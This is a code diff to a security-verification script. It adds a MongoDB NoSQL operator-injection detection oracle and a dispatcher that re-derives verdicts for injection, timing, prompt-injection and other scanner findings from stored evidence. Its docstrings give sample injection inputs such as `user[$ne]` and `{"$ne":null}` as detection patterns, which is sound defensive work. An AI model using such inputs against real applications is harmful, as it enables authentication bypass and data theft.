+    bounded depth), returned WITH its `$` (e.g. ``"$ne"``), or "". Only a KEY counts — an operator as a
+    string VALUE or a list element is inert (that is ordinary data / documentation, not query structure)."""
+    if depth > _NOSQL_SCAN_DEPTH:
+        return ""
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            if isinstance(k, str) and k[:1] == "$" and k[1:].lower() in _NOSQL_OPERATORS:
+                return "$" + k[1:].lower()
+            hit = _nosql_operator_key(v, depth + 1)
+            if hit:
+                return hit
+    elif isinstance(obj, list):
+        for v in obj[:256]:                                 # bounded fan-out
+            hit = _nosql_operator_key(v, depth + 1)
+            if hit:
+                return hit
+    return ""
+
+
+def _nosql_operator_key_in_json_text(text: str) -> str:
+    """Parse ``text`` as JSON (only when it looks like a container) and return the first operator-as-key,
+    or "". A non-JSON value (a price, an email, a scalar) parses to nothing here and stays inert."""
+    s = text.strip()
+    if s[:1] not in ("{", "[") or len(s) > _NOSQL_JSON_CAP:
+        return ""
+    try:
+        obj = json.loads(s)
+    except (ValueError, TypeError, RecursionError):
+        return ""
+    return _nosql_operator_key(obj)
+
+
+def nosql_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
+    """Fire iff a request carries a MongoDB QUERY OPERATOR injected as a KEY where a SCALAR was expected —
+    either (1) the PARAM NAME has a `$operator` as a whole BRACKET key segment (`user[$ne]`, `q[$gt]`,
+    `a[b][$in]`, `$where`), which the framework nests into `{user:{$ne:…}}`; or (2) the VALUE parses to
+    JSON with a `$operator` object KEY (`{"$ne":null}`). Proves a STRUCTURED NoSQL operator-injection
+    ATTEMPT, never exploitation. Near-zero-FP: the token must be a KNOWN query operator (curated allowlist
+    — the EJSON/JSON-Schema/DBRef `$`-keys AND the dual-use `$type`/`$regex` are excluded, since they are
+    also legitimate .NET type-discriminators / EJSON regex data) AND a KEY, so a price `$5.00`, `$net`, an
+    email, a regex `^admin$`, a mid-word `$` (`pass$word`), an operator as a string VALUE (`["$ne"]`), and
+    a plain scalar all stay inert. Pure/deterministic; bounded; ReDoS-safe."""
+    kind = OracleKind.NOSQL_INJECTION_BREAKOUT
+    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
+    name = param if isinstance(param, str) else str(param if param is not None else "")
+    # (1) the PARAM NAME injects an operator as a nested bracket/dot KEY -> a query operator lands where a
+    #     scalar param was declared. The strongest proof: it is proven by the request's own key structure.
+    m = _NOSQL_PARAM_OP_RE.search(name)
+    if m:
+        op = "$" + m.group(1).lower()
+        return OracleSignal(
+            kind=kind, fired=True, confidence=0.9,
+            evidence=(f"parameter {name!r} injects the MongoDB query operator {op!r} as a nested key where "
+                      f"a scalar was expected — a structured NoSQL operator-injection attempt"),
+            observed={"param": name, "operator": op, "vector": "operator_as_param_key", "break_out": True})
+    # (2) the VALUE is a JSON object literal whose KEY is a known operator (`username={"$ne":null}`).
+    op = _nosql_operator_key_in_json_text(text)
+    if op:
+        return OracleSignal(
+            kind=kind, fired=True, confidence=0.9,
+            evidence=(f"value parses to JSON carrying the MongoDB query operator {op!r} as an object key "
+                      f"where a scalar was expected — a structured NoSQL operator-injection attempt"),
+            observed={"param": name, "operator": op, "vector": "operator_as_json_key", "break_out": True})
+    return OracleSignal(
+        kind=kind, fired=False, confidence=0.0,
+        evidence=("no NoSQL operator-injection structure (a $-prefixed KNOWN query operator as a KEY where "
+                  "a scalar was expected); a $ in text/a price/an operator-shaped string value is inert"),
+        observed={"param": name})
+
+
+# --- the canonical-context reader: dispatch a general oracle_context to its ported oracle(s) ----
+# Mirrors ``verify.verifier.OracleVerifier._run`` for the ported kinds EXACTLY: the same ctx keys,
+# the same PROTOCOL-CONSTANT pins (the differential discriminator and the timing alpha are chosen by
+# the AUTHORITY, never the producer ctx — audit F8 / B3b), and the same baseline-admissibility
+# refusal (a ``request_smuggling`` baseline/mutated pair is not admissible — RED-PEN B3). The
+# retained ``oracle_context`` is the canonical verifier-context (verify.adapter.FindingContext.
+# to_verifier_context), so these keys read identically in a FindingContext dump or that projection.
+_GENERAL_HIGH_CONFIDENCE = 0.7  # verify.verifier.HIGH_CONFIDENCE — the confirm threshold
+_GENERAL_TIMING_PROTOCOL_ALPHA = 0.01  # verify.verifier._TIMING_PROTOCOL_ALPHA
+# verify.verifier._DIFFERENTIAL_CONTENT_DISCRIMINATOR — the default for EVERY class reaching the
+# differential arm (the protocol table _DIFFERENTIAL_PROTOCOL_DISCRIMINATORS is deliberately empty).
+_GENERAL_DIFFERENTIAL_CONTENT_DISCRIMINATOR: dict = {
+    "dimensions": ["status", "length", "lexical"],
+    "length_threshold": 0.05,
+    "lexical_threshold": 0.10,
+    "expect": "differ",
+}
+# verify.verifier._DIFFERENTIAL_BASELINE_REFUSED. No alias in verify.verifier._ALIASES folds onto
+# ``request_smuggling`` (checked against the in-tree table), so the string-normalised class suffices;
+# the parity harness pins this dispatch to verifier._run over a request_smuggling context so a future
+# alias drift is caught.
+_GENERAL_DIFFERENTIAL_BASELINE_REFUSED = frozenset({"request_smuggling"})
+
+
+def _general_normalize_bug_class(bug_class: Any) -> str:
+    """The string normalisation of ``verify.verifier.normalize_bug_class`` (strip / lower / ``-``,
+    space -> ``_`` / collapse runs). The alias fold is omitted because no alias maps onto the only
+    class this dispatch keys on (``request_smuggling``); see the note above."""
+    key = (str(bug_class or "")).strip().lower().replace("-", "_").replace(" ", "_")
+    while "__" in key:
+        key = key.replace("__", "_")
+    return key
+
+
+def _general_differential_discriminator() -> dict:
+    """The discriminator the AUTHORITY re-executes a differential with — a fresh copy, never the
+    producer's (audit F8). The protocol table is empty, so it is always the content discriminator."""
+    d = _GENERAL_DIFFERENTIAL_CONTENT_DISCRIMINATOR
+    return {**d, "dimensions": list(d["dimensions"])}
+
+
+# (ctx-key predicate, re-fire closure, kind label). One entry per ported OracleKind, in the same
+# order verifier._run checks them. Each closure takes the whole verifier-context and returns an
+# ``OracleSignal`` (or ``None`` when the keys are present but the AUTHORITY refuses, e.g. a
+# request_smuggling baseline/mutated pair). ``reexecute_general_oracle`` runs every ported oracle
+# whose keys are present and combines exactly as verifier.confirm does (any high-confidence fire).
+def _gen_differential(ctx: Mapping) -> "OracleSignal | None":
+    if "smuggling_desync" in ctx:
+        return smuggling_desync_oracle(ctx["smuggling_desync"])
+    if "baseline" in ctx and "mutated" in ctx:
+        if _general_normalize_bug_class(ctx.get("bug_class", "")) in _GENERAL_DIFFERENTIAL_BASELINE_REFUSED:
+            return None
+        return differential_response_oracle(ctx["baseline"], ctx["mutated"],
+                                            _general_differential_discriminator())
+    return None
+
+
+def _gen_timing(ctx: Mapping) -> "OracleSignal | None":
+    if "baseline_latencies" in ctx and "treatment_latencies" in ctx:
+        return timing_oracle(ctx["baseline_latencies"], ctx["treatment_latencies"],
+                             injected_ms=ctx.get("timing_injected_ms"),
+                             alpha=_GENERAL_TIMING_PROTOCOL_ALPHA, dose=ctx.get("timing_dose"))
+    return None
+
+
+def _gen_boolean(ctx: Mapping) -> "OracleSignal | None":
+    if "probe_rounds" in ctx:
+        return boolean_inference_oracle(ctx["probe_rounds"],
+                                        false_baseline_samples=ctx.get("false_baseline_samples"))
+    return None
+
+
+def _gen_side_effect(ctx: Mapping) -> "OracleSignal | None":
+    if "marker" in ctx and "observed_sink" in ctx:
+        return side_effect_oracle(ctx["marker"], ctx["observed_sink"], ctx.get("observed_sink_control"))
+    return None
+
+
+def _gen_reflection(ctx: Mapping) -> "OracleSignal | None":
+    if "marker" in ctx and "observed_sink" in ctx:
+        return reflection_context_oracle(ctx["marker"], ctx["observed_sink"])
+    return None
+
+
+def _gen_evaluation(ctx: Mapping) -> "OracleSignal | None":
+    if "ssi_expected" in ctx and "ssi_observed" in ctx:
+        return ssi_evaluation_oracle(ctx.get("ssi_raw", ""), ctx["ssi_expected"],
+                                     ctx["ssi_observed"], ctx.get("ssi_control"))
+    if "eval_expected" in ctx and "eval_observed" in ctx:
+        return evaluation_oracle(ctx.get("eval_raw", ""), ctx["eval_expected"],
+                                 ctx["eval_observed"], ctx.get("eval_control"))
+    return None
+
+
+def _gen_error_signature(ctx: Mapping) -> "OracleSignal | None":
+    if "error_observed" in ctx:
+        return error_signature_oracle(ctx["error_observed"], ctx.get("error_control"))
+    return None
+
+
+def _gen_sanitizer(ctx: Mapping) -> "OracleSignal | None":
+    if "process_output" in ctx:
+        return sanitizer_signal_oracle(ctx["process_output"])
+    return None
+
+
+def _gen_system_prompt_disclosure(ctx: Mapping) -> "OracleSignal | None":
+    if "canary" in ctx and "llm_output" in ctx:
+        return system_prompt_disclosure_oracle(ctx["canary"], ctx["llm_output"])
+    return None
+
+
+def _gen_prompt_injection(ctx: Mapping) -> "OracleSignal | None":
+    if "pi_control" in ctx and "pi_treatment" in ctx:
+        return prompt_injection_oracle(ctx["pi_control"], ctx["pi_treatment"])
+    return None
+
+
+def _gen_sql_breakout(ctx: Mapping) -> "OracleSignal | None":
+    if "request_payload" in ctx:
+        return sql_injection_breakout_oracle(ctx["request_payload"], param=str(ctx.get("payload_param", "")))
+    return None
+
+
+def _gen_command_breakout(ctx: Mapping) -> "OracleSignal | None":
+    if "request_payload" in ctx:
+        return command_injection_breakout_oracle(ctx["request_payload"], param=str(ctx.get("payload_param", "")))
+    return None
+
+
+def _gen_nosql_breakout(ctx: Mapping) -> "OracleSignal | None":
+    if "request_payload" in ctx:
+        return nosql_injection_breakout_oracle(ctx["request_payload"], param=str(ctx.get("payload_param", "")))
+    return None
+
+
+def _gen_weak_crypto(ctx: Mapping) -> "OracleSignal | None":
+    if "crypto_artifact" in ctx:
+        return weak_crypto_artifact_oracle(ctx["crypto_artifact"])
+    return None
+
+
+def _gen_prototype_pollution(ctx: Mapping) -> "OracleSignal | None":
+    if "proto_pollution" in ctx:
+        return prototype_pollution_oracle(ctx["proto_pollution"])
+    return None
+
+
+# One entry per ported family (kind label -> re-fire closure). The breakout entries dispatch on the
+# SAME ``request_payload`` key but are mutually exclusive by the finding's bug_class in-tree; a
+# retained context carries at most one request-payload oracle's finding, so running the matching one
+# is faithful — the dispatch keys the breakout on the declared class to avoid re-firing all three.
+_GENERAL_ORACLE_DISPATCH: tuple = (
+    ("differential_response", _gen_differential),
+    ("timing", _gen_timing),
+    ("boolean_inference", _gen_boolean),
+    ("side_effect", _gen_side_effect),
+    ("reflection_context", _gen_reflection),
+    ("evaluation", _gen_evaluation),
+    ("error_signature", _gen_error_signature),
+    ("sanitizer_signal", _gen_sanitizer),
+    ("system_prompt_disclosure", _gen_system_prompt_disclosure),
+    ("prompt_injection", _gen_prompt_injection),
+    ("prototype_pollution", _gen_prototype_pollution),
+)
+# request_payload breakout families, keyed on the declared bug_class so only the matching parse-proof
+# oracle re-fires (mirrors verifier._run, where the class selects exactly one breakout kind).
+_GENERAL_BREAKOUT_BY_CLASS: dict = {
+    "sqli_attempt": ("sql_injection_breakout", _gen_sql_breakout),
+    "command_injection_attempt": ("command_injection_breakout", _gen_command_breakout),
+    "nosql_injection_attempt": ("nosql_injection_breakout", _gen_nosql_breakout),
+}
+# TLS_WEAKNESS kind is shared: the LIVE tls handshake path (tls key) is IRREDUCIBLE and NOT ported;
+# only the PURE weak-crypto-artifact path (crypto_artifact key) is re-derived here.
+_GENERAL_WEAK_CRYPTO = ("tls_weakness", _gen_weak_crypto)
+
+
+def reexecute_general_oracle(oracle_context: Any) -> dict:
+    """VIGIL-FREE re-execution of a general FACT's retained ``oracle_context`` (Step 2 of the audit
+    package for the PURE, stdlib-only oracle families). Re-fires every PORTED oracle whose retained
+    keys are present and reproduces the in-tree ``verifier.confirm`` combine (any high-confidence
+    fire) over the ported signals.
+
+    Returns ``{"signals": [{kind, fired, conclusive, confidence}, ...], "fired": bool,
+    "reproduced": bool, "unported_keys": [...]}`` where ``fired`` is the re-derived positive verdict
+    (a ported oracle fired at or above the confirm threshold) and ``reproduced`` is True iff at least
+    one ported oracle had keys present to re-fire. ``unported_keys`` names any IRREDUCIBLE oracle key
+    present in the context whose re-execution this file cannot perform standalone (so the caller is
+    told, honestly, that the FACT also rests on an in-VIGIL re-run — never that it was reproduced).
+
+    HONEST BOUND: re-firing proves the verdict is the correct FUNCTION of the retained evidence, NOT
+    that the evidence is live. See the section header."""
+    if not isinstance(oracle_context, Mapping):
+        return {"signals": [], "fired": False, "reproduced": False, "unported_keys": []}
+    ctx = oracle_context
+    bug_class = _general_normalize_bug_class(ctx.get("bug_class", ""))
+    signals: list = []
+
+    def _record(kind: str, sig: "OracleSignal | None") -> None:
+        if sig is not None:
+            signals.append({"kind": kind, "fired": bool(sig.fired), "conclusive": bool(sig.conclusive),
+                            "confidence": float(sig.confidence)})
+
+    for kind, fn in _GENERAL_ORACLE_DISPATCH:
+        _record(kind, fn(ctx))
+    # the request_payload breakout — only the family the declared class selects (faithful to _run)
+    if "request_payload" in ctx:
+        entry = _GENERAL_BREAKOUT_BY_CLASS.get(bug_class)
+        if entry is not None:
+            kind, fn = entry
+            _record(kind, fn(ctx))
+    _record(*(_GENERAL_WEAK_CRYPTO[0], _GENERAL_WEAK_CRYPTO[1](ctx)))
+
+    # IRREDUCIBLE oracle keys present but NOT re-derivable standalone — report them, never fake them.
+    unported = [k for k in _GENERAL_IRREDUCIBLE_CONTEXT_KEYS if k in ctx]
+    fired = any(s["fired"] and s["confidence"] >= _GENERAL_HIGH_CONFIDENCE for s in signals)
+    return {"signals": signals, "fired": fired, "reproduced": bool(signals), "unported_keys": unported}
+
+
+# The oracle_context keys of the GENUINELY-IRREDUCIBLE oracle families (live socket/DNS, browser/CDP,
+# subprocess tool, heavy dep, external collector). Their presence is REPORTED by
+# reexecute_general_oracle, never re-derived here — see LIMIT-audit-package-reproduction.
+_GENERAL_IRREDUCIBLE_CONTEXT_KEYS = frozenset({
+    "handshake", "anon_get", "tls", "dom_binding_calls", "oob_hits", "version_advisory",
+    "cert_validity", "credential_acceptance", "jwt_token", "saml_xml", "imds_capture",
+    "secret_capture", "gcp_impersonation_capture", "iam_escalation_capture", "auth_events",
+    "requested_path", "mobile_control",
+})
+
 # ---------------------------------------------------------------------------
 # 9. Authority-Envelope certificate (the accountability twin) — standalone, VIGIL-free.
 #    Re-checks: the m-of-n governance signature + the out-of-band pin; the owner-signed envelope; and
@@ -2080,6 +4929,39 @@ def _cmd_verify(args: argparse.Namespace) -> int:
     return 0 if sound else 2
 
 
+def _cmd_reexec_general(args: argparse.Namespace) -> int:
+    """Re-derive a general FACT's verdict from its retained ``oracle_context`` (Step 2, the pure
+    oracle families) with ZERO VIGIL code. Prints the re-fired signals + the combined verdict, and
+    names any IRREDUCIBLE oracle key present (whose re-verification needs an in-VIGIL re-run)."""
+    if args.prove_standalone:
+        _assert_vigil_free()
+    try:
+        oc = _load_json(args.context)
+    except (OSError, json.JSONDecodeError) as e:
+        print(f"[ERROR] {type(e).__name__}: {e}", file=sys.stderr)
+        return 3
+    # Accept either a bare oracle_context, or a {oracle_context: {...}} / PCF {value: {...}} wrapper.
+    if isinstance(oc, dict) and "oracle_context" in oc and isinstance(oc["oracle_context"], dict):
+        oc = oc["oracle_context"]
+    if isinstance(oc, dict) and set(oc) <= {"digest", "value"} and isinstance(oc.get("value"), dict):
+        oc = oc["value"]
+    res = reexecute_general_oracle(oc)
+    if not res["reproduced"]:
+        print("NOT REPRODUCED — the oracle_context carries no PORTED (pure, stdlib) general oracle key"
+              + (f"; IRREDUCIBLE keys present: {res['unported_keys']}" if res["unported_keys"] else ""))
+        return 2
+    for s in res["signals"]:
+        print(f"  oracle {s['kind']}: fired={s['fired']} conclusive={s['conclusive']} "
+              f"confidence={s['confidence']:.3f}")
+    if res["unported_keys"]:
+        print(f"  NOTE: IRREDUCIBLE oracle key(s) also present (re-verify needs an in-VIGIL re-run, "
+              f"NOT reproduced here): {res['unported_keys']}")
+    verdict = "FIRED (re-derived positive)" if res["fired"] else "no high-confidence fire (re-derived)"
+    print(f"RE-DERIVED: {verdict} — the verdict is the correct function of the RETAINED evidence "
+          f"(producer-supplied; a live re-run is still required to prove it reflects the live target)")
+    return 0 if res["fired"] else 2
+
+
 def main(argv: list) -> int:
     p = argparse.ArgumentParser(
         prog="verify_vf.py",
@@ -2129,6 +5011,15 @@ def main(argv: list) -> int:
     v.add_argument("--authority-engagement", default="", dest="authority_engagement",
                    help="the engagement the authority envelope must be for")
     v.set_defaults(fn=_cmd_verify)
+
+    rg = sub.add_parser("reexec-general",
+                        help="re-derive a general FACT's verdict from its retained oracle_context "
+                             "(Step 2, the PURE stdlib oracle families) — VIGIL-free")
+    rg.add_argument("--context", required=True,
+                    help="the retained oracle_context JSON (bare, or a {oracle_context|value: {...}} wrapper)")
+    rg.add_argument("--prove-standalone", action="store_true",
+                    help="first assert no VIGIL module is imported or importable, else exit non-zero")
+    rg.set_defaults(fn=_cmd_reexec_general)
 
     args = p.parse_args(argv)
     return args.fn(args)
